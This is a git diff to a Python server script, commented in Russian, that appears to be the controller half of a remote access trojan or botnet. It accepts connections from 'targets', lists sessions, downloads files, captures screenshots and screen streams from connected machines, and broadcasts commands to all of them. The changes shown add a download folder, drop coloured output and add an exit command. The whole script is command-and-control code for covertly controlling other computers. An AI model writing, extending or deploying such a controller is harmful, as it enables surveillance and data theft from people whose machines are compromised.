@@ -1,5 +1,4 @@
 import socket
-import termcolor
 import json
 import os
 
@@ -13,7 +12,6 @@ import struct
 from PIL import Image, ImageTk
 
 import tkinter as tk
-from tkinter import scrolledtext
 import time
 
 
@@ -46,8 +44,6 @@ class ScreenStream(tk.Tk):
 				self.canvas=tk.Canvas(self.frame, bg='#FFFFFF', width=1280, height=720)
 				self.canvas.pack(side=tk.LEFT, expand=True, fill=tk.BOTH)
 
-
-
 # Принимаем
 def reliable_recv(target):
 		data = ''
@@ -74,7 +70,7 @@ def upload_file(target, file_name):
 
 def download_file(target, file_name):
 		# Файл бинарный, поэтому нужно исп wb
-		f = open(file_name, 'wb')
+		f = open('download/' + file_name, 'wb')
 		# Чтобы обнаржуить окончание загрузки файла
 		# выставляем таймаут
 		# Если файл закочится, цикл завершится
@@ -92,7 +88,7 @@ def download_file(target, file_name):
 
 # Сделать скриншот все равно, что загрузить картинку с другого компьютера
 def screenshot(target, num):
-		f = open('screenshot_%d.png' % (num), 'wb')
+		f = open('download/screenshot_%d.png' % (num), 'wb')
 		# На запас, чтобы сделать фото
 		target.settimeout(3)
 		chunk = target.recv(1024)
@@ -233,7 +229,7 @@ def accept_conections():
 						target, ip = sock.accept()
 						targets.append(target)
 						ips.append(ip)
-						print(termcolor.colored(str(ip) + ' has connected', 'green'))
+						print(str(ip) + ' has connected')
 						output_to_html(str(ip) + ' has connected')
 						add_tareget_to_html(len(targets)-1, ip)
 				except:
@@ -252,7 +248,7 @@ sock.bind(('127.0.0.1', port))
 sock.listen(5)
 t1 = threading.Thread(target=accept_conections)
 t1.start()
-print(termcolor.colored('[+] Waiting For The Incoming Connections', 'green'))
+print('[+] Waiting For The Incoming Connections')
 output_to_html('[+] Waiting For The Incoming Connections')
 
 @eel.expose
@@ -266,6 +262,18 @@ def common_command(command):
 						print('Session ' + str(counter) + ' --- ' + str(ip))
 						output_to_html('Session ' + str(counter) + ' --- ' + str(ip))
 						counter += 1
+		# OSError: [WinError 10038] Сделана попытка выполнить операцию на объекте, не являющемся сокетом
+		elif command == 'exit':
+				for target in targets:
+						reliable_send(target, 'quit')
+						# Закривает сокет удаленного устройства
+						target.close()
+				# Закрывает свой сокет
+				sock.close()
+				# Устанавливаем флаг, что прервет accept_connections
+				stop_flag = True
+				t1.join()
+				quit()
 		elif command[:8] == 'sendall ':
 				x = len(targets)
 				print(x)
@@ -280,7 +288,7 @@ def common_command(command):
 						print('Failed')
 						output_to_html('Failed')
 		else:
-				print(termcolor.colored('[!!] Command Doesnt Exists', 'red'))
+				print('[!!] Command Doesnt Exists')
 				output_to_html('[!!] Command Doesnt Exists')
 
 
